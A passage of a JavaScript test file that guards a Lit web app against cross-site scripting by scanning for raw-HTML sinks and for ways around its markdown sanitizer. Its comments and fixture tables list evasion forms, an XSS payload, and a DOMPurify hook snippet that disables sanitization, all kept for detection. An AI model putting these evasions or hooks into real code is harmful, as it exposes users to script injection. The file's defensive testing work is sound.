                blank(i + 1, end - 1);
                noteToken(')'); // a completed regex literal ends an expression
                i = end;
                continue;
            }
        }
        if (c === "'" || c === '"') {
            let j = i + 1;
            while (j < src.length && src[j] !== c && src[j] !== '\n') {
                j += src[j] === '\\' ? 2 : 1;
            }
            if (opts.strings)
                blank(i + 1, j);
            noteToken(c);
            i = Math.min(j + 1, src.length);
            continue;
        }
        if (c === '`') {
            modes.push('template');
            noteToken(c);
            i += 1;
            continue;
        }
        if (c === '{') {
            braces[braces.length - 1] += 1;
            noteToken(c);
            i += 1;
            continue;
        }
        if (c === '}') {
            if (braces[braces.length - 1] === 0 && modes.length > 1) {
                modes.pop();
                braces.pop();
            }
            else if (braces[braces.length - 1] > 0) {
                braces[braces.length - 1] -= 1;
            }
            noteToken(c);
            i += 1;
            continue;
        }
        noteToken(c);
        i += 1;
    }
    return out.join('');
}
/**
 * The greppable opt-out for the TREE-WIDE tripwire only.
 *
 * Comment stripping handles prose; this handles the remaining case, a string
 * literal that legitimately names a banned form. It is deliberately NOT honoured
 * by the per-file rules in `sinkBindingViolations`: disarming the sound half
 * must require editing this test file, where a reviewer will see it, not adding
 * a comment to a component.
 */
const IGNORE_MARKER = 'raw-sink-scan: ignore-line';
function stripIgnoredLines(src) {
    if (!src.includes(IGNORE_MARKER))
        return src;
    return src
        .split('\n')
        .map((line) => (line.includes(IGNORE_MARKER) ? '' : line))
        .join('\n');
}
/**
 * Blanks whole `import … from '…';` statements (and side-effect imports).
 *
 * `[^;]` cannot cross a statement boundary, so a value alias sharing a line with
 * an import — `import { html } from 'lit'; const raw = unsafeHTML;` — is still
 * scanned. `await import('…')` has no `from`, so a destructuring rename off a
 * dynamic import is not blanked either; its `unsafeHTML` sits before the
 * `import` keyword and survives regardless.
 */
function stripImportStatements(code) {
    const wipe = (m) => m.replace(/[^\n]/g, ' ');
    return code
        .replace(/\bimport\b[^;]*?\bfrom\b\s*['"][^'"]*['"]\s*;/g, wipe)
        .replace(/\bimport\s*['"][^'"]*['"]\s*;/g, wipe);
}
/**
 * The balanced argument text of every `name(…)` call in `code`.
 *
 * A regex cannot do this: `unsafeHTML(renderMarkdown(c.body) + c.body)` and
 * `unsafeHTML(renderMarkdown(c.body))` share every prefix a regex would test.
 * Counting parens is the whole point — see `sinkArgumentIsSanitized`.
 */
function callArguments(code, name) {
    const args = [];
    const re = new RegExp(`\\b${name}\\s*\\(`, 'g');
    let m;
    while ((m = re.exec(code)) !== null) {
        const start = m.index + m[0].length;
        let depth = 1;
        let i = start;
        while (i < code.length && depth > 0) {
            if (code[i] === '(')
                depth += 1;
            else if (code[i] === ')')
                depth -= 1;
            i += 1;
        }
        args.push(depth === 0 ? code.slice(start, i - 1) : code.slice(start));
    }
    return args;
}
/**
 * True only if `arg` is a single `renderMarkdown(…)` call and NOTHING else.
 *
 * The rule that this replaces asked whether the sanitized call appeared at the
 * START of the argument, which is a different and much weaker question. Both of
 * the following passed it, at the live sink, with the required literal intact,
 * no new file, no new binding and the sink count unchanged:
 *
 *   unsafeHTML(renderMarkdown(c.body) + c.body)
 *   unsafeHTML(renderMarkdown('') || this.description)
 *
 * The first renders attacker markup raw immediately after the sanitized copy of
 * it; the second sanitizes a value nobody displays. Anything appended to,
 * short-circuited with, or substituted for the sanitizer's output is raw at the
 * sink, so the argument has to be the call and only the call.
 */
function sinkArgumentIsSanitized(arg) {
    const t = arg.trim();
    const head = /^renderMarkdown\s*\(/.exec(t);
    if (!head)
        return false;
    let depth = 1;
    let i = head[0].length;
    while (i < t.length && depth > 0) {
        if (t[i] === '(')
            depth += 1;
        else if (t[i] === ')')
            depth -= 1;
        i += 1;
    }
    return depth === 0 && t.slice(i).trim() === '';
}
/** 1-based line numbers at which `re` matches, for actionable failure messages. */
function matchLines(code, re) {
    const lines = [];
    code.split('\n').forEach((line, idx) => {
        if (re.test(line))
            lines.push(idx + 1);
    });
    return lines;
}
/**
 * Lit's three raw-injection directives, with the module each is exported from.
 *
 * TRIPWIRE INPUT — see mechanism (b) in the section header. Every tree-wide scan
 * here matches on the directive's own name, so any indirection that renames it
 * makes the sink invisible to all of them at once. The rules in
 * `directiveIndirectionOffenders` close the forms we know about; they are not a
 * proof that no other form exists.
 *
 * Module paths are matched on their SUFFIX, not the full specifier. Both
 * `lit/directives/unsafe-html.js` and `lit-html/directives/unsafe-html.js`
 * resolve to the same directive and both packages are installed here, so
 * anchoring on the `lit/` prefix would leave the second path as a one-word
 * bypass. (Verified: it was.)
 */
const RAW_DIRECTIVES = [
    { name: 'unsafeHTML', module: 'directives/unsafe-html.js' },
    { name: 'unsafeSVG', module: 'directives/unsafe-svg.js' },
    { name: 'unsafeStatic', module: 'static-html.js' },
];
/**
 * Raw-HTML injection APIs that must not appear outside renderMarkdown.
 *
 * TRIPWIRE, NOT A PROOF OF ABSENCE — see mechanism (b) in the section header.
 * This is an enumeration of KNOWN SINKS. It can only catch the forms named here
 * and it must be revisited whenever this codebase adopts a new raw-injection
 * API. Do not read a green result as "no raw sink exists" — read it as "none of
 * these eight forms is present in the files that were scanned".
 *
 * Known residue, recorded deliberately rather than chased: `Object.assign(el, {
 * innerHTML: x })`, a computed key (`el[k] = x` where `k` is built at runtime),
 * and any raw-write API not on this list all pass. Widening the list is the
 * treadmill this guard is on; the closed-world half plus the type-aware-lint
 * follow-up is the route off it, not a ninth pattern.
 *
 * The operator class is `(?:\+|\|\||&&|\?\?)?=` because `\s*\+?=` admitted `+=`
 * but not `||=`, `&&=` or `??=`. The trailing `(?!=)` keeps `el.innerHTML ===
 * x` — a comparison, not a write — out of the results.
 *
 * FALSE POSITIVES: these patterns run over a comment-stripped view of the file,
 * so prose naming a banned form is safe. A string literal that must name one
 * (an error message, a lint fixture) can opt out with a trailing
 * `// raw-sink-scan: ignore-line`, which blanks that line for the tree-wide
 * scans only. Grep for the marker in review; it is not honoured by the per-file
 * rules in `sinkBindingViolations`.
 */
const BANNED_SINKS = [
    { name: 'innerHTML/outerHTML assignment', pattern: /\.(inner|outer)HTML\s*(?:\+|\|\||&&|\?\?)?=(?!=)/ },
    {
        name: 'innerHTML/outerHTML indexed assignment',
        pattern: /\[['"](inner|outer)HTML['"]\]\s*(?:\+|\|\||&&|\?\?)?=(?!=)/,
    },
    { name: 'insertAdjacentHTML', pattern: /insertAdjacentHTML\s*\(/ },
    { name: 'document.write', pattern: /document\.write\s*\(/ },
    { name: 'setHTMLUnsafe', pattern: /setHTMLUnsafe\s*\(/ },
    { name: 'createContextualFragment', pattern: /createContextualFragment\s*\(/ },
    { name: 'lit unsafeSVG directive', pattern: /unsafeSVG\s*\(/ },
    { name: 'lit unsafeStatic directive', pattern: /unsafeStatic\s*\(/ },
];
/**
 * The identifiers each REQUIRED_SINKS file is allowed to use, and the one module
 * each may come from. Module paths are suffix-matched, as in RAW_DIRECTIVES.
 */
const SINK_BINDINGS = [
    { name: 'unsafeHTML', from: 'directives/unsafe-html.js', label: "lit's unsafe-html directive module" },
    { name: 'renderMarkdown', from: 'util/markdown.js', label: 'the sanitizer module' },
];
/**
 * MECHANISM (a): the closed-world half, stated as rules about how the two
 * identifiers may be USED rather than as a list of spellings to ban.
 *
 * Every previous round closed the *named form* of the previous round's finding
 * and was evaded by the next spelling one week later:
 *
 *   round 1  `unsafeHTML(c.body)`            -> banned the literal call shape
 *   round 2  `import { unsafeHTML as raw }`  -> banned `as`-aliasing
 *   round 3  `const raw = unsafeHTML`        -> value alias, no `as` at all
 *   round 3  `const renderMarkdown = s => s` -> identity shadow of the sanitizer
 *
 * A list of forms cannot terminate. These four rules can, because they are
 * positive and closed over an enumerated set of two files:
 *
 *   R1  the sanitized sink text `unsafeHTML(renderMarkdown(` is present;
 *   R2  each identifier is imported UNALIASED from the one module allowed to
 *       provide it, by a value import (not `import type`);
 *   R3  neither identifier is re-bound by a local const/let/var/function/class;
 *   R4  outside its import statement, neither identifier may appear in ANY
 *       position other than immediately called — `name(`;
 *   R5  every `unsafeHTML(…)` argument is a `renderMarkdown(…)` call AND
 *       NOTHING ELSE — see sinkArgumentIsSanitized;
 *   R6  every relative import specifier resolves to a file this guard scans, and
 *       every dynamic import specifier is a plain quoted literal;
 *   R7  no unicode/hex escape appears in code — identifiers must be spelled
 *       literally.
 *
 * R6 and R7 exist because R1–R5 all assume two things they cannot themselves
 * establish: that a name reaching the DOM comes from a file we looked at, and
 * that `unsafeHTML` is spelled `unsafeHTML`. Both assumptions were false, and
 * both mutations rendered attacker markup raw at the live sink with the suite
 * green:
 *
 *   R6  export { unsafeHTML as rawHtml } from 'lit/directives/unsafe-html.js';
 *       parked in `helper.test.ts` — excluded by isScannableSource, and so not
 *       counted by EXPECTED_SOURCE_FILES either — then imported by the sink.
 *       No rule fired: the sink file's own `unsafeHTML` was still perfect.
 *   R7  const rawHtml = \u0075nsafeHTML;
 *       TypeScript resolves the escape to the imported binding. `\bunsafeHTML\b`
 *       cannot.
 *
 * R6 is the more important of the two. The `*.test.ts` exclusion is load-bearing
 * for this file (it must be able to name the banned spellings in prose), so it
 * cannot be removed; R6 instead denies the excluded region any path INTO the
 * closed world. That is the general form: an unscanned file is only safe while
 * nothing scanned imports it.
 *
 * R4 is the rule that generalises, and it is why this is not round 5's problem.
 * `const raw = unsafeHTML`, `const S = { raw: unsafeHTML }`, `const { unsafeHTML:
 * raw } = await import(…)`, `unsafeHTML as unknown as F`, `export { unsafeHTML }`,
 * and a *parameter* named `renderMarkdown` shadowing the module import are all
 * the same violation of R4, and not one of them had to be foreseen to be caught.
 * R3 is strictly redundant against R4 and is kept only because it names the
 * mistake in the failure message. R2 is what closes the "helper moved to
 * util/format.ts" refactor, which introduces no new file and no new binding.
 *
 * Note R4 subsumes the sibling question "is the directive imported at all": a
 * file that drops the import and defines its own `unsafeHTML` fails R2 and R3.
 *
 * Takes RAW file text and derives its own views, because the rules need two:
 * R2 must see string literals (a module specifier is one), while R3 and R4 must
 * not (a message or a fixture string may legitimately name the identifier).
 * There is deliberately NO ignore-line opt-out: disarming the sound half must
 * require editing this file, where a reviewer sees it, not adding a comment to a
 * component.
 *
 * SCOPE OF THE CLAIM. "Sound" here means sound over BINDINGS — R1–R7 decide
 * which names may reach the sink and in what shape. They say nothing about what
 * the sanitizer does once called; that is mechanism (c), and (c) has a known
 * documented survivor of its own. See "WHAT THIS GUARD CLAIMS, AND WHAT IT DOES
 * NOT" in the header comment before reporting a green result as a proof.
 */
/**
 * Candidate on-disk paths, web-root-relative, for a relative import specifier
 * appearing in `fromRel`. TypeScript source imports carry a `.js` extension that
 * resolves to `.ts` on disk, so the extension is re-derived rather than trusted.
 */
function resolveRelativeImport(fromRel, spec) {
    const base = join(dirname(fromRel), spec);
    const stem = base.replace(/\.[cm]?jsx?$/, '');
    const out = [];
    for (const ext of ['.ts', '.tsx', '.mts', '.cts', '.js', '.jsx', '.mjs', '.cjs']) {
        out.push(stem + ext);
        out.push(join(base, 'index' + ext));
    }
    out.push(base);
    return out;
}
/**
 * Does a relative import specifier land on a file this guard reads?
 *
 * Inert assets are accepted without resolving. A `.css` or `.json` file cannot
 * hold code, which is exactly the argument for not scanning it in the first
 * place, so accepting it here is the same decision as INERT_EXTENSIONS rather
 * than an exemption carved out to make the tree pass. The tree has two:
 * `src/index.ts -> ./styles/theme.css` and
 * `src/gen/grpc-client.ts -> ./farmtable.json`.
 */
function importResolvesIntoScannedSet(fromRel, spec, scanned) {
    if (INERT_EXTENSIONS.some((ext) => spec.endsWith(ext)))
        return true;
    return resolveRelativeImport(fromRel, spec).some((cand) => scanned.has(cand));
}
/** Every relative or `require`d specifier in a file, in source order. */
const RELATIVE_SPECIFIER = /(?:\bfrom|\bimport|\brequire)\s*\(?\s*['"](\.[^'"]*)['"]/g;
function sinkBindingViolations(rel, src, scanned) {
    const bad = [];
    const withStrings = stripInertText(src, { strings: false });
    const code = stripInertText(src, { strings: true });
    // R1
    if (!/unsafeHTML\s*\(\s*renderMarkdown\s*\(/.test(code)) {
        bad.push(`${rel}: no longer contains unsafeHTML(renderMarkdown( — the sanitizer wrapper is gone`);
    }
    // R5
    for (const arg of callArguments(code, 'unsafeHTML')) {
        if (!sinkArgumentIsSanitized(arg)) {
            bad.push(`${rel}: unsafeHTML(${arg.trim().slice(0, 60)}) — the argument is not a bare ` +
                'renderMarkdown(…) call. Anything concatenated onto, short-circuited with, or ' +
                "substituted for the sanitizer's output reaches the DOM raw.");
        }
    }
    const clauses = [
        ...withStrings.matchAll(/\bimport\s*(type\s+)?\{([^}]*)\}\s*from\s*['"]([^'"]+)['"]/g),
    ];
    const outside = stripImportStatements(code);
    for (const { name, from, label } of SINK_BINDINGS) {
        // R2
        const bound = clauses.some(([, typeOnly, clause, spec]) => !typeOnly &&
            spec.endsWith(from) &&
            new RegExp(`(?:^|,)\\s*${name}\\s*(?:,|$)`).test(clause));
        if (!bound) {
            bad.push(`${rel}: does not import ${name} unaliased from ${label} (a specifier ending '${from}') — ` +
                'the name may therefore resolve to something other than the audited one');
        }
        // R3
        const rebindLines = matchLines(outside, new RegExp(`\\b(?:const|let|var|function|class)\\s+${name}\\b`));
        if (rebindLines.length > 0) {
            bad.push(`${rel}:${rebindLines.join(',')}: re-binds ${name} locally — this shadows the import and ` +
                'silently unwraps the sink while leaving the sink text byte-identical');
        }
        // R4
        const nonCallLines = matchLines(outside, new RegExp(`\\b${name}\\b(?!\\s*\\()`));
        if (nonCallLines.length > 0) {
            bad.push(`${rel}:${nonCallLines.join(',')}: ${name} appears in a non-called position — ` +
                `outside its import statement the only permitted use is an immediate call \`${name}(\`. ` +
                'Aliasing, destructuring-rename, a property bag, an `as` cast or a parameter of the ' +
                'same name all reach the sink under a name no scan in this file can follow.');
        }
    }
    // R6
    for (const [, spec] of withStrings.matchAll(new RegExp(RELATIVE_SPECIFIER))) {
        if (!importResolvesIntoScannedSet(rel, spec, scanned)) {
            bad.push(`${rel}: imports '${spec}', which does not resolve to any file this guard scans — ` +
                'a binding that arrives from outside the scanned set can be the raw directive ' +
                'under any name, and none of the rules above will see it');
        }
    }
    // R6b. A dynamic import whose specifier is not a plain quoted literal defeats
    // R6 by construction: there is nothing to resolve. A template-literal
    // specifier is enough, because stripInertText deliberately preserves
    // templates and `['"]` does not match a backtick.
    for (const arg of callArguments(withStrings, 'import')) {
        if (!/^\s*['"][^'"]*['"]\s*$/.test(arg)) {
            bad.push(`${rel}: import(${arg.trim().slice(0, 60)}) — a dynamic import specifier must be a ` +
                'plain quoted literal, or R6 has nothing to resolve and the module it loads is ' +
                'outside every rule here');
        }
    }
    // R7. Deliberately run over `code`, not `outside`: an escape inside an IMPORT
    // statement is the whole attack. `import { \u0075nsafeHTML as rawHtml } from
    // 'lit/directives/unsafe-html.js'` leaves the audited unaliased import in
    // place, so R2 is satisfied, and stripImportStatements used to hide the
    // escape from this rule. Module specifiers are string literals and are
    // blanked in `code`, so paths cannot false-positive here.
    const escapeLines = matchLines(code, /\\[uxU]/);
    if (escapeLines.length > 0) {
        bad.push(`${rel}:${escapeLines.join(',')}: contains a unicode or hex escape outside a string ` +
            'literal — an escape lets an identifier be spelled so that the rules above cannot ' +
            'match it. Write the name literally.');
    }
    return bad;
}
/**
 * MECHANISM (b): the tree-wide indirection tripwire.
 *
 * Input must be `stripInertText(stripIgnoredLines(src), { strings: false })` —
 * string contents are KEPT because the module specifier being matched is itself
 * a string literal.
 */
function directiveIndirectionOffenders(rel, code) {
    const offenders = [];
    const outside = stripImportStatements(code);
    for (const { name, module } of RAW_DIRECTIVES) {
        const mod = module.replace(/\./g, '\\.');
        // Anchored to an import/export brace clause. Unanchored, `\bNAME\s+as\s+`
        // also fired on `const d = unsafeHTML as unknown as F` (which R4/the
        // non-call rule below now reports properly) and on any comment containing
        // the words "unsafeHTML as".
        if (new RegExp(`(?:import|export)\\s*(?:type\\s+)?\\{[^}]*\\b${name}\\s+as\\s+`).test(code)) {
            offenders.push(`${rel}: ${name} renamed with 'as' in an import/export clause`);
        }
        if (new RegExp(`import\\s*\\*\\s*as\\s+\\w+\\s+from\\s*['"][^'"]*${mod}['"]`).test(code)) {
            offenders.push(`${rel}: ${module} imported as a namespace`);
        }
        // Re-export: flag only when the banned NAME crosses the boundary, or when
        // `export *` carries it implicitly. Matching on the module path alone
        // rejected `export { html as staticHtml } from 'lit/static-html.js'`, which
        // re-exports a safe symbol. `[^}\n]` / `[^;\n]` keep the clause inside one
        // statement: `[^;]` matches newlines, so an adjacent semicolon-less line
        // used to be swept in.
        const reexport = new RegExp(`export\\s*(\\*|\\{[^}\\n]*\\})[^;\\n]*from\\s*['"][^'"]*${mod}['"]`);
        const m = reexport.exec(code);
        if (m && (m[1] === '*' || new RegExp(`\\b${name}\\b`).test(m[1]))) {
            offenders.push(`${rel}: ${module} re-exports ${name}`);
        }
        // Value aliasing needs no keyword at all, so it cannot be caught by adding
        // a fourth import-syntax form. Stated as a usage rule instead: outside its
        // import statement the directive may only appear immediately called. This
        // is the same rule as R4 in sinkBindingViolations, applied tree-wide, and
        // it is the one that covers `const raw = unsafeHTML`, `{ raw: unsafeHTML }`
        // and `const { unsafeHTML: raw } = await import(…)` without naming them.
        for (const line of matchLines(outside, new RegExp(`\\b${name}\\b(?!\\s*\\()`))) {
            offenders.push(`${rel}:${line}: ${name} used in a non-called position`);
        }
    }
    return offenders;
}
/**
 * MECHANISM (c): sanitizer ownership. R8.
 *
 * R1–R7 are all rules about IDENTIFIERS AND CALL SHAPE. They prove that the sink
 * calls the sanitizer. They do not prove that the sanitizer still sanitizes, and
 * that is a different axis entirely. This mutation of ft-inspector-comments.ts
 * left the real sink byte-identical, satisfied every one of R1–R7 — the import
 * unaliased from the one permitted module, the name appearing nowhere but
 * immediately called, the sole argument to unsafeHTML — and rendered
 * `<img src=x onerror=alert(1)><script>alert(2)</script>` completely raw:
 *
 *   import DOMPurify from 'dompurify';
 *   DOMPurify.addHook('uponSanitizeElement',   (_n, d) => { d.allowedTags[d.tagName] = true; });
 *   DOMPurify.addHook('uponSanitizeAttribute', (_n, d) => { d.forceKeepAttr = true; });
 *
 * It is a module-level side effect in a component the app imports, so it runs on
 * load. The behavioural checks in this file never see it: they import
 * util/markdown.js directly and never load the component.
 *
 * The defect class is the one this whole issue keeps rediscovering — a check
 * derived from the thing it is checking cannot falsify it. R1–R7 read the call
 * graph, and the call graph is exactly what this attack leaves intact.
 *
 * R8  Across the scanned set, the sanitizer's own dependencies may be imported
 *     by exactly one file: the sanitizer. Any other scanned file naming either
 *     specifier is a violation.
 *
 * Stated as ownership of the IMPORT, deliberately not as a ban on `addHook`.
 * `setConfig`, `removeHook`, `removeAllHooks`, `clearConfig` and direct property
 * assignment are all equivalent, and enumerating them is the treadmill this
 * round exists to get off. A file that cannot name the module cannot reach its
 * configuration by any method name, present or future.
 *
 * The codebase already understood the sibling hazard and said so at
 * util/markdown.ts — "A private Marked instance keeps this off the shared
 * `marked` singleton" — but DOMPurify's default export IS the shared singleton
 * and had no equivalent protection. `marked` is listed here anyway: the private
 * instance is a property of how markdown.ts is written today, and R8 is what
 * keeps it from being quietly undone from another file.
 *
 * Matching is on the SPECIFIER, not on import syntax, so static, side-effect,
 * namespace, re-export, `require` and dynamic forms — including the
 * template-literal specifier that defeated R6's first draft — are one rule
 * rather than six. Subpaths count: `dompurify/dist/purify.es.mjs` is the same
 * singleton.
 *
 * Read from a view with NO `raw-sink-scan: ignore-line` opt-out, for the same
 * reason the closed-world rules have none: disarming a rule that pins the
 * security boundary must require editing THIS file, where a reviewer sees it,
 * not adding a comment to a component.
 *
 * KNOWN SURVIVOR — READ BEFORE EXTENDING THIS RULE. R8 works because the
 * `addHook` attack had to NAME 'dompurify', and a rule can take a name away.
 * Patching `Element.prototype.removeAttribute` and `Node.prototype.removeChild`
 * defeats the sanitizer just as completely and names nothing: R8 has no
 * specifier to match, and the suite stays green at 61/61. That is recorded as
 * V25 in reports/dev-195-vectors.json with its runtime-verified before/after,
 * and it is ACCEPTED, not missed. Rules of this kind can own a name; they
 * cannot own an effect. Do NOT respond by banning `.prototype` assignment — the
 * equivalents are unbounded and the ban would fake coverage. The closure is to
 * observe the effect by loading the sink modules and re-asserting the
 * sanitizer, which needs the component graph compiled and is routed to the
 * Phase 2 harness with V23 and V25 as its acceptance vectors.
 */
const SANITIZER_OWNER = 'src/util/markdown.ts';
const SANITIZER_DEPENDENCIES = ['dompurify', 'marked'];
function sanitizerOwnershipViolations(rel, code, scanned) {
    const out = [];
    // R9. R8 matches on the specifier, so an unscanned file is a laundering point
    // for it: `export { default as P } from 'dompurify'` in a `*.test.ts` file,
    // imported by any scanned component, reaches the singleton without any
    // scanned file naming either dependency. My own hunt, V24b. R6 already said
    // "an unscanned file is only safe while nothing scanned imports it" — it was
    // simply scoped to the two REQUIRED_SINKS files, which is why V24b routed
    // around it through a non-sink component. The statement was right and the
    // scope was wrong, so the same rule now covers the whole scanned set. R8 is
    // not sound without it.
    for (const [, spec] of code.matchAll(new RegExp(RELATIVE_SPECIFIER))) {
        if (!importResolvesIntoScannedSet(rel, spec, scanned)) {
            out.push(`${rel}: imports '${spec}', which is outside the scanned set — an unscanned file can ` +
                're-export anything, including the sanitizer dependencies R8 forbids naming here');
        }
    }
    if (rel === SANITIZER_OWNER)
        return out;
    for (const dep of SANITIZER_DEPENDENCIES) {
        const spec = new RegExp(`['"\`]${dep}(?:/[^'"\`]*)?['"\`]`);
        for (const line of matchLines(code, spec)) {
            out.push(`${rel}:${line}: names the module specifier '${dep}'. Only ${SANITIZER_OWNER} may ` +
                "import the sanitizer's dependencies. Any other file holding a reference to them " +
                'can rewrite the shared configuration they are used through — DOMPurify\'s default ' +
                'export is a singleton, and two addHook calls at module scope turn renderMarkdown ' +
                'into a pass-through while every rule about the sink binding still holds.');
        }
    }
    return out;
}
function sinkBinding() {
    const root = findWebRoot();
    const files = [];
    collectSourceFiles(join(root, 'src'), files);
    check('sink scan actually reads the source tree', () => {
        if (files.length !== EXPECTED_SOURCE_FILES) {
            throw new Error(`expected to scan exactly ${EXPECTED_SOURCE_FILES} source files, found ${files.length} — ` +
                'before changing this number, open the added or removed file(s) and confirm none of ' +
                'them introduces a raw-HTML sink or a raw Lit directive under another name. ' +
                'Adding a file is normally fine and updating the count is normally the right ' +
                'action — but that confirmation is the decision this pin exists to force, and it is ' +
                'the only thing standing between the tree and a raw sink in a brand-new file. ' +
                'Never change it merely to make a red suite go green.');
        }
    });
    // Web-root-relative paths of every file this guard reads. R6 requires each
    // relative import in a sink file to land in here.
    const scannedRel = new Set(files.map((file) => relative(root, file)));
    // MECHANISM (a). Each required sink is read by explicit path, so a file that is
    // renamed, deleted, or rewritten into a form the tree-wide regexes no longer
    // match fails here instead of quietly leaving their results. See
    // sinkBindingViolations for the four rules and why they are rules rather than
    // a list of banned spellings.
    for (const rel of REQUIRED_SINKS) {
        check(`${rel} binds its markdown sink to the sanitizer`, () => {
            const src = readFileSync(join(root, rel), 'utf8');
            const violations = sinkBindingViolations(rel, src, scannedRel);
            if (violations.length > 0) {
                throw new Error(`sink binding broken:\n      ${violations.join('\n      ')}`);
            }
        });
    }
    // MECHANISM (c). Deliberately NOT built from the `scanned` view below: that one
    // honours the ignore-line marker, and R8 must not be disarmable from outside
    // this file. See sanitizerOwnershipViolations.
    check('the sanitizer exclusively owns its own dependencies', () => {
        const offenders = [];
        for (const file of files) {
            const rel = relative(root, file);
            const code = stripInertText(readFileSync(file, 'utf8'), { strings: false });
            offenders.push(...sanitizerOwnershipViolations(rel, code, scannedRel));
        }
        if (offenders.length > 0) {
            throw new Error(`sanitizer configuration is reachable from another file:\n      ${offenders.join('\n      ')}`);
        }
    });
    // Comment-stripped view of every scanned file, computed once. `strings: false`
    // keeps module specifiers and quoted property keys intact for the tree-wide
    // patterns that need them.
    const scanned = files.map((file) => ({
        rel: relative(root, file),
        code: stripInertText(stripIgnoredLines(readFileSync(file, 'utf8')), { strings: false }),
    }));
    const sinks = [];
    for (const { rel, code } of scanned) {
        for (const arg of callArguments(code, 'unsafeHTML')) {
            sinks.push({ file: rel, arg });
        }
    }
    // Pinned exactly, not as a floor. The old `>= 2` floor sat exactly on the true
    // count, so it caught a disappearing sink only by coincidence — restore the
    // count with a duplicate elsewhere and the same regression goes green again.
    // Update alongside REQUIRED_SINKS when a legitimate sink is added or removed.
    check('unsafeHTML call sites are still found', () => {
        if (sinks.length !== REQUIRED_SINKS.length) {
            throw new Error(`expected exactly ${REQUIRED_SINKS.length} unsafeHTML call sites, found ${sinks.length} — ` +
                'update REQUIRED_SINKS deliberately if a sink was added or removed');
        }
    });
    // MECHANISM (b), tripwire. Indirection defeats every name-based scan in this
    // function: rename the directive and the sink disappears from the case lists
    // rather than failing either. See directiveIndirectionOffenders.
    check('tripwire: no file reaches a raw-HTML directive under another name', () => {
        const offenders = [];
        for (const { rel, code } of scanned) {
            offenders.push(...directiveIndirectionOffenders(rel, code));
        }
        if (offenders.length > 0) {
            throw new Error('raw-HTML directive obscured by indirection: ' +
                offenders.join(', ') +
                ' [tripwire: catches the listed indirection forms only, not all of them]');
        }
    });
    // The argument must be a bare renderMarkdown(…) call, not merely start with
    // one. `unsafeHTML(renderMarkdown(c.body) + c.body)` satisfied the old
    // prefix-shaped version of this check while rendering the raw body.
    check('every unsafeHTML call site passes nothing but renderMarkdown output', () => {
        const unbound = sinks.filter((s) => !sinkArgumentIsSanitized(s.arg));
        if (unbound.length > 0) {
            throw new Error('unsanitized unsafeHTML sink(s): ' +
                unbound.map((s) => `${s.file} -> unsafeHTML(${s.arg.trim().slice(0, 60)})`).join(', '));
        }
    });
    // unsafeHTML is not the only way to reach the DOM with a raw string; a new
    // innerHTML sink would bypass renderMarkdown without touching the checks
    // above. See BANNED_SINKS for the scope and — importantly — the limits.
    check('tripwire: no listed raw-HTML sink other than unsafeHTML is present', () => {
        const offenders = [];
        for (const { rel, code } of scanned) {
            for (const { name, pattern } of BANNED_SINKS) {
                if (pattern.test(code)) {
                    offenders.push(`${rel} (${name})`);
                }
            }
        }
        if (offenders.length > 0) {
            throw new Error(`raw-HTML sink outside renderMarkdown in: ${offenders.join(', ')} ` +
                '[tripwire: an enumeration of known sinks, not a proof of absence]');
        }
    });
    // ---------------------------------------------------------------------------
    // Fixtures for the rules themselves.
    //
    // Everything above is asserted against the tree, so it only exercises the
    // shapes the tree happens to contain. The `lit/static-html.js` false-positive
    // control that previous rounds cited as deliberate passed VACUOUSLY: no file
    // in the repo imports it, so nothing ran. Adding production code to create a
    // control would be worse. These tables exercise the rules directly, and sit
    // under the same EXPECTED_CHECKS pin as everything else.
    //
    // The positive tables are the regression test for this round specifically:
    // every evasion found by review rounds 1-3 is listed, so a future
    // simplification of the rules cannot quietly reopen one.
    // ---------------------------------------------------------------------------
    const LEGITIMATE_SOURCE = [
        "import { html } from 'lit/static-html.js';",
        "import { html, literal } from 'lit/static-html.js';",
        "export { html as staticHtml } from 'lit/static-html.js';",
        "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
        'const t = html`${unsafeHTML(renderMarkdown(this.body))}`;',
        'const parsed = value as unknown as string;',
        'const proto = /^https:\\/\\//.test(url);',
        'const rx = /innerHTML\\s*=/;',
        'const sep = /[//]/.source;',
        'const node = document.createElement("div");',
        'el.textContent = body;',
        'if (el.innerHTML === previous) return;',
    ];
    check('fixture: legitimate source does not trip the raw-directive tripwire', () => {
        const offenders = [];
        for (const fixture of LEGITIMATE_SOURCE) {
            const code = stripInertText(stripIgnoredLines(fixture), { strings: false });
            offenders.push(...directiveIndirectionOffenders('<fixture>', code).map((o) => `${o} :: ${fixture}`));
            for (const { name, pattern } of BANNED_SINKS) {
                if (pattern.test(code))
                    offenders.push(`${name} :: ${fixture}`);
            }
        }
        if (offenders.length > 0) {
            throw new Error(`the guard rejects legitimate source: ${offenders.join(' | ')}`);
        }
    });
    const INERT_PROSE = [
        '// SECURITY: never import unsafeHTML as something else - it defeats the scan.',
        '// Do not use document.write( here; use lit templating.',
        '/* renderMarkdown must wrap every unsafeHTML call. */',
        'const t = html`<!-- renderMarkdown, not unsafeHTML, is the boundary. -->${x}`;',
        "const ADVICE = 'never do el.innerHTML = userInput'; // raw-sink-scan: ignore-line",
    ];
    check('fixture: comments and marked lines cannot turn the suite red', () => {
        const offenders = [];
        for (const fixture of INERT_PROSE) {
            const code = stripInertText(stripIgnoredLines(fixture), { strings: false });
            offenders.push(...directiveIndirectionOffenders('<fixture>', code).map((o) => `${o} :: ${fixture}`));
            for (const { name, pattern } of BANNED_SINKS) {
                if (pattern.test(code))
                    offenders.push(`${name} :: ${fixture}`);
            }
        }
        if (offenders.length > 0) {
            throw new Error(`the guard rejects prose about itself: ${offenders.join(' | ')}`);
        }
    });
    const INDIRECTION_EVASIONS = [
        "import { unsafeHTML as raw } from 'lit/directives/unsafe-html.js';",
        "import { unsafeHTML as raw } from 'lit-html/development/directives/unsafe-html.js';",
        "import { unsafeSVG as raw } from 'lit/directives/unsafe-svg.js';",
        "import { unsafeStatic as raw } from 'lit/static-html.js';",
        "import * as d from 'lit/directives/unsafe-html.js';",
        "export { unsafeHTML } from 'lit/directives/unsafe-html.js';",
        "export * from 'lit/directives/unsafe-html.js';",
        'const raw = unsafeHTML;',
        'const S = { raw: unsafeHTML };',
        "const { unsafeHTML: raw } = await import('lit/directives/unsafe-html.js');",
        'const d = unsafeHTML as unknown as (s: string) => unknown;',
        'const raw = unsafeHTML\n;',
        'callIt(unsafeHTML);',
    ];
    check('fixture: every known indirection form is caught by the tripwire', () => {
        const missed = [];
        for (const fixture of INDIRECTION_EVASIONS) {
            const code = stripInertText(stripIgnoredLines(fixture), { strings: false });
            if (directiveIndirectionOffenders('<fixture>', code).length === 0)
                missed.push(fixture);
        }
